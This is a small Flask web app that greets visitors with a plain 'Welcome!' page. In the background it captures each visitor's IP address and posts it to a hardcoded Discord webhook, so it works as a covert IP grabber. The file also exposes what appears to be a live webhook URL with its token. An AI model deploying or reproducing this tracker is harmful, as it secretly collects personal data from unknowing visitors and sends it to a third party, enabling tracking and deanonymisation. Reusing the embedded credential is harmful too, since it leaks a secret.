from flask import Flask, request
import requests

app = Flask(__name__)

WEBHOOK_URL = 'https://discord.com/api/webhooks/1382611407199014912/A6GHc65WzrRbciHynuMssat9MI0eYlONJTq3sinrx5TtmjGpCFtc7qCwlfirzh_qxfPd'

@app.route('/')
def home():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    send_to_discord(ip)
    return "<h1>Welcome!</h1>"

def send_to_discord(ip):
    data = {
        "content": f"New visitor IP: {ip}"
    }
    requests.post(WEBHOOK_URL, json=data)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
